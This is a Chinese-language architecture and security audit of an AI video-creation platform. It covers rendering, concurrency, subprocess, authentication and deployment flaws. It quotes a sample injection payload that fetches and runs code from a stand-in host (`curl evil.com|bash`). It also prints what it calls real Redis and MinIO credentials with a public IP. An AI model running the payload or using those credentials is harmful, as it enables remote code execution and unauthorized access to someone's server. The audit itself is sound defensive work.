# 架构与框架问题深度分析报告

本报告针对 AI 视频创作平台（ai-video-studio）的现有架构、并发控制、子进程管理、网络IO、状态管理、安全合规以及部署等方面进行了深度剖析，总结出核心问题、潜在风险以及重构优先级。

> 报告代码引用统一使用 `file:///` 协议深链，可直接点击跳转到源文件具体行号。所有问题均经过源码逐行验证。
>
> 本报告合并了原 `framework-issues.md`（架构 + 安全 + 部署视角）与 `优化问题.md`（流水线逐环节视角），按"环节 + 严重度"双重维度组织。

---

## 0. 流水线全景与文档导航

```
文案输入 → ① AI 分镜生成 → ② TTS 配音 → ③ 素材匹配 → ④ 单场景合成 → ⑤ 拼接+混音 → ⑥ 导出
                            ↑                   ↑              ↑              ↑
                       P0 问题6/7         P0-1 注入       P0-2 静默      P0-1 注入
```

- 第一节：核心架构问题（双轨分裂、同步阻塞）
- 第二节：并发与资源管理
- 第三节：子进程与安全（TTS 注入、API Key 加密、Docker 凭据）
- 第四节：网络与 I/O
- 第五节：状态管理与一致性
- 第六节：前端与接口设计
- 第七节：部署与环境
- 第八节：流水线逐环节深度问题
- 第九节：重构路线图（25 条 P0~P3 任务）

严重度图例：🔒 P0 安全/致命 / ⚠️ P1 架构/质量 / 📝 P2 可维护 / 🟡 P3 体验

---

## 一、 核心架构问题 ⚠️

### 1. 同步阻塞式渲染（最严重）
* **相关代码**：[`src/app/api/projects/[id]/render/route.ts:48`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/render/route.ts#L43-L48)
* **具体表现**：
  ```typescript
  // 渲染 API 内部直接同步等待整套流水线执行完毕
  const result = await renderProjectInline(id, session.user.id); // 可能阻塞 5 ~ 30 分钟
  ```
* **潜在风险**：
  * **HTTP 超时**：浏览器、Nginx 代理或 Serverless 平台（如 Vercel）通常有 30s ~ 2min 的硬性超时限制。长视频渲染必然导致连接中断，用户侧表现为"网络错误"。
  * **无进度反馈**：同步等待期间，前端只能通过 SSE 间接拿到状态变化，且 SSE 在 Vercel 等 serverless 平台也无法工作。
  * **重复渲染风险**：用户因超时刷新页面或重新点击，会触发新的渲染请求，导致服务器重复执行高负载任务。
  * **资源不可释放**：Next.js 单一 Node 进程承载所有用户的 HTTP 请求，渲染期间事件循环被 TTS/FFmpeg 阻塞，其他 API 全部不可用。

### 2. 渲染路径严重分裂（双轨制不一致）
* **相关代码**：
  * 内联渲染：[`src/lib/render/pipeline.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts)
  * Worker 渲染：[`workers/index.ts`](file:///f:/创作/20260512/ai-video-studio/workers/index.ts)
  * 编辑器渲染：[`src/app/api/projects/[id]/render-editor/route.ts`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/render-editor/route.ts)
  * 导出渲染：[`src/app/api/projects/[id]/export/route.ts`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/export/route.ts)
* **对比差异**：
  | 功能特性 | Inline 渲染 (`pipeline.ts`) | Worker 渲染 (`workers/index.ts`) | 编辑器渲染 (`render-editor`) |
  | :--- | :--- | :--- | :--- |
  | **场景合成方式** | 逐场景合成 + concat demuxer（防命令行过长） | 单条 `filter_complex` 长命令（易触发命令行超长） | 单段裁剪 + concat demuxer |
  | **MG 动画判断** | `isMGAnimationScene()` 智能判断 | 无，素材下载失败直接使用黑色背景 | 无 |
  | **Bilibili 搜索** | 支持，带负面过滤和流媒体解析下载 | 无，仅有 Puppeteer 截图 fallback | 无 |
  | **背景音乐 (BGM)** | 暂无 | 支持 BGM 混音及淡入淡出 | 支持 BGM 混音 |
  | **存储方式** | 本地文件系统 (`uploads/`) | S3 / MinIO 对象存储 | 本地文件系统 |
  | **字幕生成** | 复用 `subtitle.ts` | 复用 `subtitle.ts` | 无字幕 |
  | **工作目录清理** | `rm(workDir)` 仅在成功路径调用 | `rm(workDir)` 仅在成功路径调用 | **未清理** |
* **潜在风险**：
  * **维护成本翻倍**：核心业务逻辑在 4 个文件中重复实现，修复一个 Bug 必须在所有路径同时修改，极易遗漏。
  * **表现不一致**：同一项目在本地（Inline）和生产（Worker）渲染出的视频可能效果、字幕样式、背景音乐完全不同。
  * **`render-editor` 严重退化**：没有字幕、没有智能素材选择、且临时目录**从不清理**——3 次编辑即可吃满磁盘。

### 3. pipeline.ts 单文件 1896 行（"上帝文件"）
* **相关代码**：[`src/lib/render/pipeline.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts)（约 1896 行）
* **潜在风险**：
  * **TTS、素材、字幕、合成、混音 5 个阶段**全挤在一个文件，IDE 跳转、Code Review、单元测试全部失效。
  * 任何 phase 调整都要通读全文件，【流水线视角】的"autoSearchBilibili 520 行上帝函数"问题（见第 8 节问题 12）只是其中一例。

---

## 二、 并发与资源管理

### 4. 并发控制过于激进且无取消机制
* **相关代码**：[`src/lib/render/pipeline.ts:485, 622`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L485-L490) — `TTS_CONCURRENCY = 5`、`MATERIALS_CONCURRENCY = 4`
* **具体表现**：
  ```typescript
  const TTS_CONCURRENCY = 5;      // 5 个并行 TTS 进程
  const MATERIALS_CONCURRENCY = 4; // 4 个并行素材下载 + FFmpeg 进程
  ```
* **潜在风险**：
  * **CPU 瞬间爆满**：在 4 核服务器上，4 个 FFmpeg 进程 + 5 个 Python 进程同时运行会导致 CPU 占用率瞬间达到 100%。
  * **无级联取消**：使用 `Promise.all`（通过 `mapConcurrent`）执行并发任务，一旦其中一个场景处理失败，整个 Promise 立即 reject，但**其他已经启动的子进程并不会被杀掉**，它们会在后台继续无意义地消耗 CPU/磁盘。
  * **单点失败导致整体重来**：若 20 个场景中只有第 19 个失败，前面 18 个已经处理好的素材在下一次重新渲染时全部需要重做，**缺乏断点续传/增量渲染机制**。
  * **缺少并发降级**：当系统负载已高时仍按固定并发数执行，没有自适应限流。
  * **临时目录竞态**（【流水线视角】问题 22）：`workDir = join(tmpdir(), "render-${projectId}")` 固定名，**重复触发**渲染会出现"两个进程写同一目录、scene-0.mp4 互相覆盖"的典型竞态。

### 5. SQLite 并发写入瓶颈
* **相关代码**：[`src/lib/db/index.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/db/index.ts)
* **具体表现**：
  * 使用 `better-sqlite3` 作为数据库驱动。
  * **未显式启用** **WAL (Write-Ahead Logging)** 模式。
  * **未配置** `busy_timeout`。
* **潜在风险**：
  * **事件循环阻塞**：`better-sqlite3` 是同步阻塞式 API。在高并发写入（如多个场景同时更新 `materialId` 或 `audioUrl`）时，会直接卡死 Node.js 的事件循环。
  * **SQLITE_BUSY 错误**：默认的 Journal 模式在并发写入时极易触发数据库锁冲突，导致渲染任务因数据库写入失败而中断。
  * **AI 缓存表自动创建不可靠**：[`src/lib/ai/cache.ts:79-95`](file:///f:/创作/20260512/ai-video-studio/src/lib/ai/cache.ts#L75-L98) 第一次写入失败时尝试 `CREATE TABLE IF NOT EXISTS`，但若多次并发同时执行可能导致竞争。
  * **生产路径使用 SQLite 不合理**：BullMQ Worker 和 Next.js App 共享同一个 SQLite 文件，部署为多副本时直接锁死。

---

## 三、 子进程与安全隐患 🔒

### 6. 子进程管理缺失（僵尸进程风险）
* **相关代码**：[`src/lib/render/pipeline.ts:6-7`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L6-L7) `execFile` / `exec`
* **具体表现**：
  ```typescript
  const execFileAsync = promisify(execFile);
  // 调用时仅传入了 timeout 参数
  await execFileAsync("ffmpeg", [...], { timeout: 60000 });
  ```
* **潜在风险**：
  * **孤儿/僵尸进程**：`execFile` 的 `timeout` 达到后，Node.js 仅会 reject 对应的 Promise，但**并不会主动向子进程发送 `SIGKILL` 信号**。FFmpeg 进程会继续在后台运行，成为僵尸进程，直至服务器内存或句柄耗尽。
  * **Windows 兼容性问题**：在 Windows 环境下，普通的 kill 信号无法终止子进程树，需要显式调用 `taskkill /F /T /PID`。现有代码未做此类平台适配。
  * **错误日志丢失**：未对子进程的 `stderr` 进行结构化收集，FFmpeg 报错时只能拿到通用的退出码，无法精准定位是"格式不支持"、"滤镜语法错误"还是"磁盘空间不足"。

### 7. TTS 命令行注入风险 🔒🔒
* **相关代码**：[`src/lib/render/pipeline.ts:376-393`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L376-L393)
* **具体表现**：
  ```typescript
  await execAsync(
    `${py} -m edge_tts --voice "${voice}" --rate "+0%" --text "${text.replace(/"/g, '\\"')}" --write-media "${outputFile}"`,
    { timeout: 60000, maxBuffer: 1024 * 1024 }
  );
  // 兜底分支甚至直接 shell: "powershell.exe"
  ```
* **潜在风险**：
  * **命令注入**：旁白文本（`text`）来自 AI 生成或用户输入。仅对双引号做了简单转义，对 `;`、`|`、`&`、`$()`（Linux）或 `&`、`|`、`%`（Windows）等 shell 特殊字符毫无防护。
  * **场景化攻击**：恶意用户可构造旁白 `"$(curl evil.com|bash)"`，借助 Bash 变量替换实现**任意远程命令执行**。
  * **兜底分支雪上加霜**：`shell: "powershell.exe"` 让 Node.js 走 PowerShell 调用，Windows 平台下 `;` 和 `&` 是合法的语句分隔符，几乎任何字符串都可执行。
  * **`audioFile` 路径未转义**：若项目 ID 含特殊字符，路径中出现的 `;` 同样可注入。

### 8. AI 提供商 API Key 明文存储与回显 🔒
* **相关代码**：
  * Schema：[`prisma/schema.prisma:18-19`](file:///f:/创作/20260512/ai-video-studio/prisma/schema.prisma#L18-L19) — `aiApiKey String?` 明文字段
  * API 回显：[`src/app/api/user/settings/route.ts:64-72`](file:///f:/创作/20260512/ai-video-studio/src/app/api/user/settings/route.ts#L60-L74) — `select` 直接返回 `aiApiKey`
* **具体表现**：
  ```typescript
  // PATCH /api/user/settings
  const user = await prisma.user.update({
    where: { id: session.user.id },
    data: normalized,
    select: { id: true, name: true, email: true, aiApiKey: true, ... }  // 直接返回明文
  });
  ```
* **潜在风险**：
  * **数据库裸奔**：用户填写的 Anthropic / OpenAI / MiMo API Key 以明文形式存在 SQLite 文件中，任何能够读 DB 文件的人（包括备份、日志容器）即可窃取所有用户的额度。
  * **响应链回显**：API 直接在 JSON 响应中返回 `aiApiKey`，前端 `settings/page.tsx:45` 直接 `setForm` 存储到 React state——若页面存在 XSS，所有用户的 API Key 都会泄露。
  * **日志泄露**：`router.ts` 中的 `getAIProvider` 在抛错时可能将包含 API Key 的配置信息打到日志。
  * **多用户隔离失效**：配合问题 10（认证绕过），攻击者可直接通过 `GET /api/user/settings` 拿到默认用户的 Key。

### 9. docker-compose.yml 硬编码生产凭据 🔒🔒
* **相关代码**：[`docker/docker-compose.yml:14-21, 29-36`](file:///f:/创作/20260512/ai-video-studio/docker/docker-compose.yml#L14-L21)
* **具体表现**：
  ```yaml
  REDIS_URL: "redis://:0DEc%24268b%23476210Ff%21@39.91.167.69:6379"
  S3_ENDPOINT: http://39.91.167.69:9100
  S3_ACCESS_KEY: root
  S3_SECRET_KEY: dachkj123
  ```
* **潜在风险**：
  * **明文密码进版本控制**：Redis 密码、MinIO 根密钥、IP 地址全部硬编码在 `docker-compose.yml`，该文件极易被提交到 Git 公开仓库。
  * **真实公网 IP 暴露**：`39.91.167.69` 是一台真实服务器，黑客可直接尝试攻击。
  * **数据库文件 + 凭据双失**：MinIO 默认账户 `root/dachkj123`、Redis 弱口令+`%23` 转义问题——任何拿到 compose 文件的人即可拿下整个对象存储和缓存层。
  * **Git 历史永久留存**：即使后续删除，凭据已在历史 commit 中，攻击者使用 `git log -p` 即可挖出。

---

## 四、 网络与 I/O 问题

### 10. Fetch 调用缺乏统一封装与流式处理
* **具体表现**：整个项目直接调用原生 `fetch` 超过 **40 处**，超时时间从 5s 到 30s 不等，重试机制散落在 [`src/lib/utils/retry.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/utils/retry.ts)。
* **典型代码**：
  * [`workers/index.ts:210`](file:///f:/创作/20260512/ai-video-studio/workers/index.ts#L208-L212) — `await res.arrayBuffer()` 全量载入
  * [`src/app/api/projects/[id]/export/route.ts:86`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/export/route.ts#L82-L90) — `Buffer.from(await res.arrayBuffer())` 全量载入
  * [`src/lib/render/pipeline.ts:1073`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L1065-L1075) — Bilibili 头探测
* **潜在风险**：
  * **内存溢出 (OOM)**：下载视频素材时普遍使用 `await res.arrayBuffer()` 一次性将整个视频读入内存。20 个并发场景 × 50MB 视频 = 1GB 内存峰值，Node.js 默认堆仅 1.5GB，直接 OOM Crash。
  * **缺乏连接池复用**：每次请求都重新建立 TCP 连接，高频搜索/下载时会产生大量 TIME_WAIT 连接，耗尽服务器端口资源。
  * **超时不一致**：搜索 Bilibili `15s`、下载素材 `30s`、TTS `60s`、渲染 `600s`——一个不统一的超时矩阵导致故障定位困难。
  * **没有 HTTP Agent 配置**：默认 `fetch` 使用 `http.globalAgent`，不支持 keep-alive、IPv4 优先、TLS 调优等。

### 11. 临时目录清理不可靠
* **相关代码**：
  * [`src/lib/render/pipeline.ts:472, 1050+`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L470-L475) — `rm(workDir)` 仅在成功路径
  * [`src/app/api/projects/[id]/render-editor/route.ts`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/render-editor/route.ts) — 整个文件**完全没有 `rm` 调用**
* **潜在风险**：
  * **磁盘空间耗尽**：渲染中途报错、超时、Node 进程被 PM2/systemd 强杀，临时目录永久残留。每天 100 个项目渲染失败即可吃满 100GB 磁盘。
  * **`render-editor` 灾难性泄漏**：每次用户编辑都会创建 `editor-render-{projectId}` 目录，从不清理。10 个项目编辑 10 次 = 100 个临时目录、几十 GB 数据。
  * **没有项目结束统一钩子**：缺少"项目级临时目录注册表 + 启动时清扫"机制。

---

## 五、 状态管理与数据一致性

### 12. 认证机制被完全绕过 🔒
* **相关代码**：
  * [`src/lib/auth/session.ts:21-28`](file:///f:/创作/20260512/ai-video-studio/src/lib/auth/session.ts#L19-L29)
  * [`src/middleware.ts:2-5`](file:///f:/创作/20260512/ai-video-studio/src/middleware.ts)
  ```typescript
  // requireSession：未登录直接返回硬编码默认用户
  export async function requireSession() {
    const session = await getSession();
    if (session?.user?.id) return session;
    return { user: DEFAULT_USER } as any;
  }
  ```
* **潜在风险**：
  * **数据越权与泄露**：多用户环境下，所有未登录用户的项目、素材、渲染任务全部绑定在同一个 `DEFAULT_USER` 上，用户之间可以互相查看、修改、删除对方的视频。
  * **AI Key 通用**：配合问题 8，未登录用户可直接通过 `GET /api/user/settings` 读取默认用户的 API Key。
  * **中间件空跑**：`src/middleware.ts` 的 `matcher: []` 实际上不匹配任何路由，登录保护形同虚设。
  * **NextAuth 配置存在但未使用**：`authOptions` 在 [`src/lib/auth/config.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/auth/config.ts) 实现了完整的 Credentials Provider + JWT，但 `requireSession` 主动绕过了这套机制。

### 13. 渲染状态检查存在竞态条件 (Race Condition)
* **相关代码**：[`src/app/api/projects/[id]/render/route.ts:25-30`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/render/route.ts#L24-L31)
* **具体表现**：
  ```typescript
  if (project.status === "RENDERING") {
    return NextResponse.json({ error: "项目正在渲染中" }, { status: 409 });
  }
  // ...后续直接修改为 RENDERING 状态，没有原子更新保障
  ```
* **潜在风险**：
  * **并发冲突**：在高并发或用户快速重复点击时，两个请求可能同时通过 `if` 检查，随后同时向数据库写入 `RENDERING` 状态并启动两个独立的渲染流水线，导致文件读写冲突、数据库死锁、磁盘被双重写入。
  * **缺少数据库级锁**：没有 `prisma.$transaction` 包裹读+写，没有 `update where status not in ('RENDERING')` 形式的条件更新。

### 14. 状态机不统一
* **相关代码**：
  * 枚举定义：[`prisma/schema.prisma:72-82`](file:///f:/创作/20260512/ai-video-studio/prisma/schema.prisma#L72-L82) — 9 个 `ProjectStatus`
  * 散落的状态更新：[`analyze/route.ts:60`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/analyze/route.ts)、[`storyboard/generate/route.ts:60`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/storyboard/generate/route.ts)、[`render/route.ts:42`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/render/route.ts) 等 8+ 处
* **潜在风险**：
  * **状态流转逻辑难以维护**：9 个状态（DRAFT/ANALYZING/STORYBOARD_GENERATING/STORYBOARD_READY/PRODUCING/EDITING/RENDERING/COMPLETED/FAILED）散落在 API 路由、Pipeline 核心库、Worker 脚本等多个地方。
  * **挂起状态**：常出现"项目已失败但状态仍显示渲染中"的卡死案例——SSE 监听器断开、Worker 进程崩溃后，没有定时回收机制。
  * **`PRODUCING` / `EDITING` 状态无后端使用**：前端 `statusMap` 引用了这两种状态，但后端没有任何路由会写入它们，造成"前端期望但后端永不触发"。

### 15. 渲染任务无取消接口
* **潜在风险**：
  * **没有 `DELETE /api/projects/[id]/render` 或 `POST /cancel`**：用户一旦发起渲染，**只能等 5~30 分钟结束**。没有中途取消。
  * **孤儿 RenderJob 累积**：`RenderJob` 表中可能积累数百条"超时但未清理"的记录。
  * **CPU 持续被占用**：用户想停掉渲染但停不了，CPU 持续跑满。

### 16. FAILED 状态恢复路径不完整
* **相关代码**：[`src/app/api/projects/[id]/render/route.ts:40`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/render/route.ts)
* **具体表现**：
  ```typescript
  // render/route.ts 只在 status==="FAILED" 时重置为 STORYBOARD_READY
  if (project.status === "FAILED") {
    await prisma.project.update({ where: { id }, data: { status: "STORYBOARD_READY" } });
  }
  ```
* **潜在风险**：
  * 若失败发生在 `STORYBOARD_GENERATING` 阶段，项目卡在中间态无法恢复（没有重置为 `DRAFT` 的兜底）。
  * 没有事务回滚：分镜生成失败可能残留半截 `Storyboard/Scene` 记录。

---

## 六、 前端与接口设计

### 17. 双重轮询机制浪费资源
* **相关代码**：
  * SSE：[`src/app/api/projects/[id]/events/route.ts:60`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/events/route.ts#L58-L62) — `setInterval(..., 2000)` 每 2 秒查 DB
  * 轮询：[`src/app/(platform)/projects/[id]/page.tsx:60-72`](file:///f:/创作/20260512/ai-video-studio/src/app/(platform)/projects/[id]/page.tsx#L60-L72) — `refetchInterval: 3000` 又 3 秒一次
* **潜在风险**：
  * **DB 负载倍增**：渲染期间同一个项目被同时 SSE 轮询（2s）+ React Query 轮询（3s）= 平均每秒 0.83 次 DB 完整查询（包含 `storyboard.scenes`）。
  * **N 个项目并发时**：10 个项目同时渲染 → DB 8 QPS 持续负载，SQLite 直接卡死。
  * **SSE 连接数无上限**：没有用户级 / 项目级的连接数限制，恶意用户可耗尽 Node.js 句柄。

### 18. 没有 API 限流
* **潜在风险**：
  * **`/api/projects` POST**、**`/api/projects/[id]/analyze`**、**`/api/projects/[id]/render`** 等均无任何限流。
  * 单个 IP 可在 1 分钟内触发数十次 LLM 调用，**直接刷爆 Anthropic/OpenAI 配额**。
  * 没有任何 `rate-limiter-flexible` / `next-rate-limit` 集成。
  * 没有"每个项目每天最多 N 次渲染"的业务级限流。

### 19. 请求体大小无统一限制
* **相关代码**：[`next.config.ts:8-12`](file:///f:/创作/20260512/ai-video-studio/next.config.ts)
  ```typescript
  experimental: {
    serverActions: { bodySizeLimit: "100mb" }
  }
  ```
* **潜在风险**：
  * `bodySizeLimit: "100mb"` 仅作用于 Server Action，**对 Route Handler 无效**。
  * 上传视频片段 [`/api/projects/[id]/segments/upload`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/segments/upload/route.ts) 直接使用 `await req.formData()` + `Buffer.from(await file.arrayBuffer())`，**没有任何文件大小校验**。恶意用户上传 10GB 文件即可 OOM 整个 Node 进程。
  * 用户设置 `aiApiKey` 接口也无限制——但影响较小。

### 20. `productionMeta` JSON 字段缺乏 schema 校验
* **相关代码**：
  * 写入：[`src/app/api/projects/[id]/storyboard/generate/route.ts:78-88`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/[id]/storyboard/generate/route.ts#L78-L90) — 仅在字段非空时 `JSON.stringify(meta)`
  * 读取：[`src/lib/render/pipeline.ts:629, 639`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L625-L645) 等多处 `JSON.parse(scene.productionMeta)`
* **潜在风险**：
  * **类型不安全**：所有读取点都使用 `any`，AI 生成结构微调即可让运行时静默丢失字段。
  * **错误吞噬**：所有 `try { JSON.parse } catch {}` 都是空 catch，字段损坏后无任何日志。
  * **没有 Zod schema 集中管理**：`scripts[]`、`sourceVideos[]`、`materialQueryEn` 等字段没有类型契约，IDE 不能跳转，重构困难。

### 21. AI 缓存使用 `$queryRawUnsafe` 且无迁移
* **相关代码**：[`src/lib/ai/cache.ts:31-37`](file:///f:/创作/20260512/ai-video-studio/src/lib/ai/cache.ts#L29-L40)
* **潜在风险**：
  * **`$queryRawUnsafe` 拼接**：`cacheKey` 来自 `createHash` 摘要，理论安全；但 `getCachedResult` 的 `try/catch` 失败兜底返回 `null`，可能掩盖真实 SQL 错误。
  * **表结构漂移**：在 [`cache.ts:81-92`](file:///f:/创作/20260512/ai-video-studio/src/lib/ai/cache.ts#L79-L95) 中尝试 `CREATE TABLE IF NOT EXISTS` 进行表自举，但**没有 Prisma 迁移同步**——DBA 接手时无从知道这张表是从哪里冒出来的。
  * **无 TTL 主动清理**：只有读取时按 `maxAgeMs` 删除过期项，写入时只 `INSERT OR REPLACE`；长期运行后 `ai_cache` 表会无限膨胀。

---

## 七、 部署与环境兼容性

### 22. App Dockerfile 缺失系统依赖 🔥
* **相关代码**：[`docker/Dockerfile`](file:///f:/创作/20260512/ai-video-studio/docker/Dockerfile)
* **具体表现**：与 `Dockerfile.workers` 对比，**App 镜像没有安装 FFmpeg、Python、edge-tts、Chromium**。
* **潜在风险**：
  * **生产部署直接 500**：`pnpm start` 启动后，任何调用 `/api/projects/[id]/render` 的请求都会因为 `execFile("ffmpeg")` 报 `ENOENT` 而失败。
  * **Standalone 不携带 native binding**：`better-sqlite3.node` 在 Linux Alpine 与 Windows 宿主之间不通用，跨平台部署需要重新 `npm rebuild`。
  * **`.prisma/client` 动态生成路径错位**：`output = "../src/generated/prisma"` 让生成文件游离于 `node_modules`，Standalone 打包时极易丢失。

### 23. `uploads/` 目录未加入 `.gitignore`
* **相关代码**：[`.gitignore`](file:///f:/创作/20260512/ai-video-studio/.gitignore)
* **潜在风险**：
  * **隐私泄露**：`uploads/{projectId}/` 下存放用户的**原始视频片段、渲染输出、缩略图**，全部可能误提交。
  * **仓库膨胀**：每个 50MB 的项目 × 10 个项目 = 500MB 仓库。
  * **`data/dev.db` 在 .gitignore 中**，但 `uploads/` 缺失——容易让人误以为"上传文件"也要入库。

### 24. Standalone 打包与原生模块冲突
* **相关代码**：[`next.config.ts`](file:///f:/创作/20260512/ai-video-studio/next.config.ts)
* **潜在风险**：
  * `better-sqlite3` 包含 C++ 原生绑定（`.node` 文件）。Windows 构建的 standalone 包无法直接在 Linux 容器中运行。
  * `output: "standalone"` 需要 `prisma generate` 在**构建机**而非运行时执行——README 未提示这一点。
  * `serverExternalPackages` 列表中包含 `.prisma/client`（带点号），这是路径而不是包名，配置无效。

### 25. 无健康检查 / 监控探针
* **潜在风险**：
  * 没有 `GET /api/health` 端点，K8s/Docker 编排器无法做 `livenessProbe` / `readinessProbe`。
  * 没有 Prometheus metrics（队列长度、渲染耗时分布、TTS 失败率）。
  * 没有结构化日志——`console.log/error` 散落各处，无法接入 ELK/Loki。
  * **故障只能靠用户反馈**，没有"渲染失败率突增"告警。

### 26. 字体硬编码 Windows 路径 🟡
* **相关代码**：[`src/lib/render/pipeline.ts:1413, 1620`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L1413-L1415)
  ```typescript
  const fontPath = "C\\:/Windows/Fonts/msyh.ttc";
  ```
* **潜在风险**：
  * 虽然 `subtitle.ts` 提供了跨平台 `getDefaultFontPath()`，但 MG 动画分支直接硬编码 Windows 路径。Docker/Linux 部署时 MG 场景渲染失败或字体缺失。
  * 应统一改用 `getDefaultFontPath()`，或在 Docker 镜像中预装 Noto Sans CJK。

---

## 八、 流水线逐环节深度问题（按执行顺序）

### ① AI 分镜生成

#### 27. quick-generate 和 storyboard/generate 是两套并行的分镜实现 🔴
* **相关代码**：
  * [`src/app/api/projects/[id]/storyboard/generate/route.ts`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/%5Bid%5D/storyboard/generate/route.ts) 走 `generateStoryboard()`、`lib/ai/router.ts`、缓存
  * [`src/app/api/projects/[id]/quick-generate/route.ts`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/%5Bid%5D/quick-generate/route.ts) 自己内置 prompt、调 `generateAI()`，**不走缓存、不走标准 router**
* **潜在风险**：两入口 prompt 不同、字段映射不同、错误处理不同；`quick-generate` 把 `productionMeta` 存成包含 `sources/preference/era` 等空字段的不一致结构。**用户从不同入口进来，分镜质量完全不同**。

#### 28. quick-generate 写死 provider 配置且自相矛盾 🔴
* **相关代码**：[`src/app/api/projects/[id]/quick-generate/route.ts:153`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/%5Bid%5D/quick-generate/route.ts)
  ```typescript
  const aiConfig = buildProviderConfig({
    aiProvider: "claude",        // 写死 claude
    aiModel: "mimo-v2.5-pro",    // 但模型又指定 mimo
  });
  ```
* **潜在风险**：`buildProviderConfig` 看到 `aiProvider:"claude"` 但无 key 时会降级到 MiMo——这种"写死 provider 却传别的 model"的调用极脆弱，**用户切了 AI 模型，quick-generate 根本不生效**。

#### 29. AI 返回 JSON 靠正则提取，无 schema 校验 🟠
* **相关代码**：[`src/app/api/projects/[id]/quick-generate/route.ts`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/%5Bid%5D/quick-generate/route.ts)
  ```typescript
  const jsonMatch = result.match(/\{[\s\S]*\}/);
  parsed = JSON.parse(jsonMatch[0]);
  ```
* **潜在风险**：
  * 若 AI 返回内容里带 `{...}`（讲编程、讲 JSON 的科普），正则会截错。
  * 解析后只检查 `scenes` 非空，不校验 `voiceoverText/scripts/sourceVideos` 字段类型和长度。
  * `scripts` 字段被声明为"拼接后必须等于 `voiceoverText`"，但生成端无任何校验，全靠下游 `subtitle.ts` 相似度检查兜底。

#### 30. 分镜场景数估算偏激进 🟠
* **相关代码**：[`src/app/api/projects/[id]/storyboard/generate/route.ts:43`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/%5Bid%5D/storyboard/generate/route.ts)
  ```typescript
  const autoSceneCount = Math.max(5, Math.min(30, Math.round(chineseChars / 70)));
  ```
* **潜在风险**：70 字/场景对短视频偏密。一段 700 字文案会拆成 10 个场景，每个场景都要跑一次 B 站搜索 + 下载 + 渲染，整个流程 O(N) 串行，**场景越多越容易超时/失败**。

### ② TTS 配音

#### 31. TTS 路由里的时长计算是错的（3 套系数不一致）🔴
* **相关代码**：
  * [`src/app/api/projects/[id]/tts/route.ts:82`](file:///f:/创作/20260512/ai-video-studio/src/app/api/projects/%5Bid%5D/tts/route.ts) — `audioDuration: scene.voiceoverText.length / 4`
  * [`src/lib/render/subtitle.ts:399`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/subtitle.ts) — 中文字/3.5 + 非中文/5
  * `quick-generate` 里又用 /3.5
* **潜在风险**：TTS 路由存的 `audioDuration` 直接进字幕同步计算，**会导致字幕和实际语音不同步**。已有 `estimateAudioDuration()` 公共函数但没被统一使用。

#### 32. TTS 失败被静默吞掉，用静音兜底 🔴🔴（业务灾难）
* **相关代码**：[`src/lib/render/pipeline.ts:529-607`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L529-L607)
* **具体表现**：MiMo 或 Edge TTS 任一失败，生成一段静音 MP3 继续渲染。`RenderJob.errorMessage` 未写任何警告。
* **潜在风险**：
  * **用户拿到"有画面有字幕但没声音"的视频，无任何错误提示**。
  * 最严重的是 Edge TTS 依赖 Python 环境，容器里没装 `edge_tts` 时**每次都静音**——这是隐性致命故障。
  * 配合"渲染双轨"，TTS 错误根本无法被监控捕获。

#### 33. TTS 并发 5，但 Edge TTS 走 shell，Windows 下不稳定 🟠
* **相关代码**：`generateTTS` 在 [`pipeline.ts:373`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L373-L395) 中轮换 `python/python3`，最后 fallback 到 `powershell.exe`
* **潜在风险**：Windows 上 5 路并发调 `python -m edge_tts` 容易卡死或被反爬。失败后又走 WAV 静音兜底，**表面成功实际无声**。

### ③ 素材匹配（最复杂、问题最集中）

#### 34. B 站搜索代码在 pipeline.ts 和 bilibili.ts 里重复实现且不一致 🔴
* **相关代码**：
  * [`src/lib/materials/bilibili.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/materials/bilibili.ts) — `searchBilibiliVideos`，Cookie 用 `buvid3=placeholder`
  * [`src/lib/render/pipeline.ts:917-948`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L917-L948) — 内联重写 `bilibiliSearch`，Cookie 用 `buvid3=infoc;`，header 不同、重试策略不同
* **潜在风险**：维护 `bilibili.ts` 不会影响实际渲染。两层逻辑还会各自演化，产生分歧。

#### 35. B 站 stream URL 过期问题只解决了一半 🔴
* **相关代码**：[`src/lib/render/pipeline.ts:1249-1268`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L1249-L1268)
* **具体表现**：
  ```typescript
  if (isBilibili) {
    const freshUrl = await getBilibiliVideoStream(bvid);
    ...
  }
  ```
  只在"已下载素材"分支刷新 URL。
